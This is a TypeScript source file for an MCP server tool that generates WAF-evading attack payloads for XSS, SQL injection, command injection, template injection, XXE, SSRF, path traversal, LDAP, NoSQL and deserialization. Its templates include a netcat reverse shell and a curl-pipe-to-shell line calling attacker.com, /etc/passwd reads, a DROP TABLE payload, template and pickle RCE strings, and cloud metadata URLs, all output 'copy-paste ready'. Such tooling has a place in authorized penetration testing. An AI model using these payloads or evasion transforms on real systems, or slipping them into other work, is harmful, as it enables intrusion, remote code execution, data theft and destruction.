import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import { sanitize, validateInput } from '../utils/sanitize.js';
import { logToolInvocation, logOutput } from '../utils/auditLog.js';

type VulnType = 'xss' | 'sqli' | 'cmdi' | 'ssti' | 'xxe' | 'path-traversal' | 'ssrf' | 'ldap' | 'nosql' | 'deserialize';
type Context = 'html-text' | 'html-attribute' | 'html-href' | 'javascript' | 'json' | 'sql-string' | 'sql-numeric' | 'shell' | 'url' | 'xml';
type EvasionLevel = 'none' | 'basic' | 'advanced';

interface Payload {
  payload: string;
  technique: string;
  context?: string;
  evasion?: string;
}

interface PayloadTemplate {
  base: Payload[];
  contextVariants: Partial<Record<Context, Payload[]>>;
  evasionVariants: {
    basic: Array<(p: string) => Payload>;
    advanced: Array<(p: string) => Payload>;
  };
}

// URL encode a string
function urlEncode(s: string): string {
  return encodeURIComponent(s);
}

// Double URL encode
function doubleUrlEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}

// HTML entity encode
function htmlEncode(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// Unicode escape
function unicodeEscape(s: string): string {
  return s.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

// Hex encode for SQL
function hexEncode(s: string): string {
  return '0x' + Buffer.from(s).toString('hex');
}

// Case variation
function mixCase(s: string): string {
  return s.split('').map((c, i) => i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()).join('');
}

const payloadTemplates: Record<VulnType, PayloadTemplate> = {
  xss: {
    base: [
      { payload: '<script>alert(1)</script>', technique: 'Basic script tag' },
      { payload: '<img src=x onerror=alert(1)>', technique: 'Event handler - onerror' },
      { payload: '<svg onload=alert(1)>', technique: 'SVG onload' },
      { payload: '<body onload=alert(1)>', technique: 'Body onload' },
      { payload: '<iframe src="javascript:alert(1)">', technique: 'JavaScript protocol' },
      { payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', technique: 'Nested tags bypass' },
      { payload: '<input onfocus=alert(1) autofocus>', technique: 'Autofocus trigger' },
      { payload: '<marquee onstart=alert(1)>', technique: 'Marquee event' },
      { payload: '<details open ontoggle=alert(1)>', technique: 'Details toggle' },
      { payload: '<video><source onerror=alert(1)>', technique: 'Video source error' },
    ],
    contextVariants: {
      'html-attribute': [
        { payload: '" onmouseover="alert(1)', technique: 'Attribute breakout - mouseover' },
        { payload: "' onfocus='alert(1)' autofocus='", technique: 'Single quote breakout' },
        { payload: '" onclick="alert(1)" x="', technique: 'Attribute injection - click' },
        { payload: "javascript:alert(1)//", technique: 'JavaScript protocol (href context)' },
      ],
      'javascript': [
        { payload: "'-alert(1)-'", technique: 'String breakout with expression' },
        { payload: "';alert(1)//", technique: 'String breakout with statement' },
        { payload: '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e', technique: 'Hex escape' },
        { payload: '</script><script>alert(1)</script>', technique: 'Script breakout' },
      ],
      json: [
        { payload: '{"x":"</script><script>alert(1)</script>"}', technique: 'JSON in script context' },
      ],
    },
    evasionVariants: {
      basic: [
        (p) => ({ payload: urlEncode(p), technique: 'URL encoded', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/script/gi, 'ScRiPt'), technique: 'Mixed case', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/ /g, '/'), technique: 'Slash instead of space', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: doubleUrlEncode(p), technique: 'Double URL encoded', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/</g, '\\x3c').replace(/>/g, '\\x3e'), technique: 'Hex escape', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/script/gi, 'scr\x00ipt'), technique: 'Null byte injection', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/alert/g, 'al\\u0065rt'), technique: 'Unicode escape', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/<script>/gi, '<script/x>'), technique: 'Malformed tag', evasion: 'advanced' }),
      ],
    },
  },

  sqli: {
    base: [
      { payload: "' OR '1'='1", technique: 'Boolean - always true' },
      { payload: "' OR '1'='1'--", technique: 'Boolean with comment' },
      { payload: "' OR '1'='1'/*", technique: 'Boolean with block comment' },
      { payload: "1' AND '1'='2", technique: 'Boolean - always false' },
      { payload: "' UNION SELECT NULL--", technique: 'UNION injection probe' },
      { payload: "' UNION SELECT 1,2,3--", technique: 'UNION with columns' },
      { payload: "'; DROP TABLE users--", technique: 'Destructive - drop table' },
      { payload: "' AND 1=1--", technique: 'Numeric boolean true' },
      { payload: "' AND SLEEP(5)--", technique: 'Time-based blind (MySQL)' },
      { payload: "'; WAITFOR DELAY '0:0:5'--", technique: 'Time-based blind (MSSQL)' },
      { payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", technique: 'Nested time-based' },
      { payload: "' ORDER BY 1--", technique: 'Column enumeration' },
    ],
    contextVariants: {
      'sql-numeric': [
        { payload: '1 OR 1=1', technique: 'Numeric boolean' },
        { payload: '1; DROP TABLE users', technique: 'Stacked query' },
        { payload: '1 UNION SELECT 1,2,3', technique: 'Numeric UNION' },
      ],
    },
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/ /g, '/**/'), technique: 'Comment as space', evasion: 'basic' }),
        (p) => ({ payload: mixCase(p), technique: 'Mixed case', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/OR/gi, '||'), technique: 'Operator substitution', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/ /g, '%09'), technique: 'Tab as space', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/SELECT/gi, 'SEL%00ECT'), technique: 'Null byte in keyword', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/'/g, "''"), technique: 'Quote doubling', evasion: 'advanced' }),
        (p) => ({ payload: hexEncode(p.replace(/'/g, '')), technique: 'Hex encoding', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/ AND /gi, '/*!50000AND*/'), technique: 'MySQL version comment', evasion: 'advanced' }),
      ],
    },
  },

  cmdi: {
    base: [
      { payload: '; id', technique: 'Semicolon chain' },
      { payload: '| id', technique: 'Pipe' },
      { payload: '|| id', technique: 'OR chain' },
      { payload: '&& id', technique: 'AND chain' },
      { payload: '`id`', technique: 'Backtick execution' },
      { payload: '$(id)', technique: 'Command substitution' },
      { payload: '; cat /etc/passwd', technique: 'File read' },
      { payload: '| nc -e /bin/sh attacker.com 4444', technique: 'Reverse shell' },
      { payload: '; curl attacker.com/shell.sh | sh', technique: 'Download and execute' },
      { payload: '\nid\n', technique: 'Newline injection' },
    ],
    contextVariants: {
      shell: [
        { payload: "'; id #", technique: 'Quote breakout with comment' },
        { payload: '"; id #', technique: 'Double quote breakout' },
      ],
    },
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/ /g, '${IFS}'), technique: 'IFS variable', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/cat/g, 'c\\at'), technique: 'Backslash escape', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/ /g, '%09'), technique: 'Tab character', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/ /g, '{,}'), technique: 'Brace expansion', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/id/g, "i''d"), technique: 'Empty quotes', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/id/g, '$\'\\x69\\x64\''), technique: 'Hex in ANSI-C quoting', evasion: 'advanced' }),
        (p) => ({ payload: `echo ${Buffer.from(p).toString('base64')} | base64 -d | sh`, technique: 'Base64 encoded', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/;/g, '%0a'), technique: 'Newline as separator', evasion: 'advanced' }),
      ],
    },
  },

  ssti: {
    base: [
      // Detection probes
      { payload: '{{7*7}}', technique: 'Jinja2/Twig detection' },
      { payload: '${7*7}', technique: 'Freemarker/Velocity detection' },
      { payload: '<%= 7*7 %>', technique: 'ERB detection' },
      { payload: '#{7*7}', technique: 'Ruby interpolation detection' },
      { payload: '*{7*7}', technique: 'Thymeleaf detection' },
      // Jinja2 exploitation
      { payload: "{{config.items()}}", technique: 'Jinja2 config dump' },
      { payload: "{{''.__class__.__mro__[1].__subclasses__()}}", technique: 'Jinja2 class enumeration' },
      { payload: "{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}", technique: 'Jinja2 RCE template' },
      // Twig
      { payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", technique: 'Twig RCE' },
      // Freemarker
      { payload: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', technique: 'Freemarker RCE' },
    ],
    contextVariants: {},
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/\{\{/g, '{%print ').replace(/\}\}/g, '%}'), technique: 'Print statement', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/7\*7/g, '7*\'7\'*1'), technique: 'String multiplication', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/__/g, '\\x5f\\x5f'), technique: 'Hex escape underscores', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/\./g, '|attr(\''), technique: 'Attribute filter', evasion: 'advanced' }),
      ],
    },
  },

  xxe: {
    base: [
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', technique: 'Basic file read' },
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', technique: 'SSRF via XXE' },
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>', technique: 'External DTD' },
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', technique: 'PHP filter wrapper' },
      { payload: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', technique: 'PHP expect wrapper' },
    ],
    contextVariants: {},
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/SYSTEM/g, 'PUBLIC "" '), technique: 'PUBLIC instead of SYSTEM', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/<!DOCTYPE/g, '<!DOCTYPE ').replace(/<!ENTITY/g, '\n<!ENTITY'), technique: 'Whitespace variation', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/file:\/\//g, 'file:////'), technique: 'Extra slashes', evasion: 'advanced' }),
      ],
    },
  },

  'path-traversal': {
    base: [
      { payload: '../../../etc/passwd', technique: 'Basic traversal' },
      { payload: '..\\..\\..\\windows\\win.ini', technique: 'Windows traversal' },
      { payload: '....//....//....//etc/passwd', technique: 'Nested traversal' },
      { payload: '../../../etc/passwd%00.jpg', technique: 'Null byte (legacy)' },
      { payload: '/etc/passwd', technique: 'Absolute path' },
      { payload: 'file:///etc/passwd', technique: 'File protocol' },
    ],
    contextVariants: {
      url: [
        { payload: '..%2f..%2f..%2fetc/passwd', technique: 'URL encoded slash' },
        { payload: '..%252f..%252f..%252fetc/passwd', technique: 'Double encoded slash' },
      ],
    },
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/\.\.\//g, '..%2f'), technique: 'URL encoded', evasion: 'basic' }),
        (p) => ({ payload: p.replace(/\.\.\//g, '..%5c'), technique: 'Backslash encoded', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/\.\.\//g, '..%252f'), technique: 'Double URL encoded', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/\.\.\//g, '..%c0%af'), technique: 'Overlong UTF-8', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/\.\.\//g, '..%c1%9c'), technique: 'UTF-8 backslash', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/\.\.\//g, '..;/'), technique: 'Semicolon bypass', evasion: 'advanced' }),
      ],
    },
  },

  ssrf: {
    base: [
      { payload: 'http://127.0.0.1', technique: 'Localhost' },
      { payload: 'http://localhost', technique: 'Localhost name' },
      { payload: 'http://[::1]', technique: 'IPv6 localhost' },
      { payload: 'http://0.0.0.0', technique: 'All interfaces' },
      { payload: 'http://169.254.169.254/latest/meta-data/', technique: 'AWS metadata' },
      { payload: 'http://metadata.google.internal/computeMetadata/v1/', technique: 'GCP metadata' },
      { payload: 'http://169.254.169.254/metadata/instance', technique: 'Azure metadata' },
      { payload: 'file:///etc/passwd', technique: 'File protocol' },
      { payload: 'dict://localhost:11211/stat', technique: 'Dict protocol' },
      { payload: 'gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a', technique: 'Gopher Redis' },
    ],
    contextVariants: {},
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace('127.0.0.1', '127.1'), technique: 'Shortened IP', evasion: 'basic' }),
        (p) => ({ payload: p.replace('localhost', 'localtest.me'), technique: 'DNS alias', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace('127.0.0.1', '0x7f000001'), technique: 'Hex IP', evasion: 'advanced' }),
        (p) => ({ payload: p.replace('127.0.0.1', '2130706433'), technique: 'Decimal IP', evasion: 'advanced' }),
        (p) => ({ payload: p.replace('127.0.0.1', '0177.0.0.1'), technique: 'Octal IP', evasion: 'advanced' }),
        (p) => ({ payload: p.replace('http://', 'http://attacker.com@'), technique: 'URL authority', evasion: 'advanced' }),
        (p) => ({ payload: p.replace('127.0.0.1', '127.0.0.1.nip.io'), technique: 'DNS rebinding service', evasion: 'advanced' }),
      ],
    },
  },

  ldap: {
    base: [
      { payload: '*', technique: 'Wildcard' },
      { payload: '*)(&', technique: 'Filter breakout' },
      { payload: '*)(uid=*))(|(uid=*', technique: 'OR injection' },
      { payload: '*)((|userPassword=*)', technique: 'Password enumeration' },
      { payload: 'admin)(&)', technique: 'Tautology' },
      { payload: 'x])(cn=admin))%00', technique: 'Null byte termination' },
    ],
    contextVariants: {},
    evasionVariants: {
      basic: [
        (p) => ({ payload: urlEncode(p), technique: 'URL encoded', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/\*/g, '%2a'), technique: 'Encoded wildcard', evasion: 'advanced' }),
        (p) => ({ payload: p.replace(/\(/g, '%28').replace(/\)/g, '%29'), technique: 'Encoded parentheses', evasion: 'advanced' }),
      ],
    },
  },

  nosql: {
    base: [
      { payload: '{"$gt": ""}', technique: 'MongoDB greater than' },
      { payload: '{"$ne": null}', technique: 'MongoDB not equal' },
      { payload: '{"$regex": ".*"}', technique: 'MongoDB regex' },
      { payload: "' || '1'=='1", technique: 'JavaScript injection' },
      { payload: "'; return true; var x='", technique: 'JS function escape' },
      { payload: '{"$where": "sleep(5000)"}', technique: 'MongoDB time-based' },
      { payload: '{"username": {"$regex": "^a"}}', technique: 'Regex enumeration' },
    ],
    contextVariants: {
      json: [
        { payload: '{"$or": [{"a": 1}, {"b": 2}]}', technique: 'OR operator' },
      ],
    },
    evasionVariants: {
      basic: [
        (p) => ({ payload: p.replace(/"/g, '\\"'), technique: 'Escaped quotes', evasion: 'basic' }),
      ],
      advanced: [
        (p) => ({ payload: p.replace(/\$/g, '\\u0024'), technique: 'Unicode dollar sign', evasion: 'advanced' }),
      ],
    },
  },

  deserialize: {
    base: [
      // Java
      { payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA...', technique: 'Java serialized object (base64)' },
      { payload: 'ysoserial CommonsCollections1 "id"', technique: 'ysoserial command template' },
      // PHP
      { payload: 'O:8:"stdClass":0:{}', technique: 'PHP object injection' },
      { payload: 'a:1:{s:4:"test";O:8:"stdClass":0:{}}', technique: 'PHP array with object' },
      // Python
      { payload: "cos\nsystem\n(S'id'\ntR.", technique: 'Python pickle RCE' },
      { payload: 'gASVEwAAAAAAAACMBnN5c3RlbZSMBmlklJOUhZRSlC4=', technique: 'Python pickle base64' },
      // Ruby
      { payload: '--- !ruby/object:Gem::Installer\ni: x', technique: 'Ruby YAML' },
      // Node.js
      { payload: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}()"}', technique: 'Node serialize RCE' },
    ],
    contextVariants: {},
    evasionVariants: {
      basic: [],
      advanced: [],
    },
  },
};

function generatePayloadsForType(
  type: VulnType,
  context: Context | undefined,
  evasion: EvasionLevel,
  count: number,
  target: string | undefined
): Payload[] {
  const template = payloadTemplates[type];
  const results: Payload[] = [];

  // Start with base payloads
  for (const p of template.base) {
    let payload = p.payload;
    // Replace target placeholder for SSRF
    if (target && type === 'ssrf') {
      payload = payload.replace(/attacker\.com/g, target);
    }
    if (target && type === 'xxe') {
      payload = payload.replace(/attacker\.com/g, target);
    }
    results.push({ ...p, payload });
  }

  // Add context-specific variants
  if (context && template.contextVariants[context]) {
    for (const p of template.contextVariants[context]!) {
      results.push(p);
    }
  }

  // Add evasion variants
  if (evasion !== 'none') {
    const basePayloads = template.base.slice(0, 3); // Apply evasion to first 3 base payloads

    if (evasion === 'basic' || evasion === 'advanced') {
      for (const p of basePayloads) {
        for (const transform of template.evasionVariants.basic) {
          results.push(transform(p.payload));
        }
      }
    }

    if (evasion === 'advanced') {
      for (const p of basePayloads) {
        for (const transform of template.evasionVariants.advanced) {
          results.push(transform(p.payload));
        }
      }
    }
  }

  // Return requested count
  return results.slice(0, count);
}

export function registerGeneratePayloadsTool(server: McpServer): void {
  server.tool(
    'generate-payloads',
    'Generate security testing payloads with encoding and WAF evasion techniques',
    {
      type: z
        .enum(['xss', 'sqli', 'cmdi', 'ssti', 'xxe', 'path-traversal', 'ssrf', 'ldap', 'nosql', 'deserialize'])
        .describe('Vulnerability type'),
      context: z
        .enum(['html-text', 'html-attribute', 'html-href', 'javascript', 'json', 'sql-string', 'sql-numeric', 'shell', 'url', 'xml'])
        .optional()
        .describe('Injection context for context-aware payloads'),
      evasion: z
        .enum(['none', 'basic', 'advanced'])
        .default('basic')
        .describe('WAF evasion level'),
      count: z.number().default(10).describe('Number of payloads to generate'),
      target: z.string().optional().describe('Custom callback target for SSRF/XXE payloads'),
    },
    async ({ type, context, evasion, count, target }) => {
      const validation = validateInput(target || '');

      logToolInvocation('generate-payloads', { type, context, evasion, count, target }, validation.warnings);

      const payloads = generatePayloadsForType(type, context, evasion, count, target);

      const typeLabels: Record<VulnType, string> = {
        xss: 'Cross-Site Scripting (XSS)',
        sqli: 'SQL Injection',
        cmdi: 'Command Injection',
        ssti: 'Server-Side Template Injection',
        xxe: 'XML External Entity (XXE)',
        'path-traversal': 'Path Traversal',
        ssrf: 'Server-Side Request Forgery (SSRF)',
        ldap: 'LDAP Injection',
        nosql: 'NoSQL Injection',
        deserialize: 'Insecure Deserialization',
      };

      const tableRows = payloads
        .map((p, i) => {
          const escapedPayload = p.payload
            .replace(/\|/g, '\\|')
            .replace(/`/g, '\\`');
          const evasionNote = p.evasion ? ` [${p.evasion}]` : '';
          return `| ${i + 1} | \`${escapedPayload.slice(0, 60)}${escapedPayload.length > 60 ? '...' : ''}\` | ${p.technique}${evasionNote} |`;
        })
        .join('\n');

      const report = `# Generated Payloads: ${typeLabels[type]}

**Type:** ${type}
**Context:** ${context || 'generic'}
**Evasion Level:** ${evasion}
**Count:** ${payloads.length}
${target ? `**Custom Target:** ${target}` : ''}

## Payloads

| # | Payload | Technique |
|---|---------|-----------|
${tableRows}

## Raw Payloads (Copy-Paste Ready)

\`\`\`
${payloads.map(p => p.payload).join('\n')}
\`\`\`

## Usage Notes

- **FOR AUTHORIZED SECURITY TESTING ONLY**
- Always obtain proper authorization before testing
- Test in isolated environments when possible
- Document all testing activities

### Context Tips
${type === 'xss' ? `
- **html-text**: Use script tags or event handlers
- **html-attribute**: Break out of attribute with " or '
- **javascript**: Break out of strings with ' or "
` : ''}
${type === 'sqli' ? `
- **sql-string**: Break out with ' and use comments (-- or /*)
- **sql-numeric**: No quotes needed, use numeric boolean logic
` : ''}
${type === 'cmdi' ? `
- **shell**: Try multiple separators: ; | || && \` $()
- Consider OS differences (Windows vs Unix)
` : ''}
`;

      logOutput('generate-payloads', {
        success: true,
        summary: `Generated ${payloads.length} ${type} payloads`,
        metrics: { type, context: context || 'generic', evasion, count: payloads.length },
      });

      return {
        content: [{
          type: 'text' as const,
          text: report,
        }],
      };
    }
  );
}
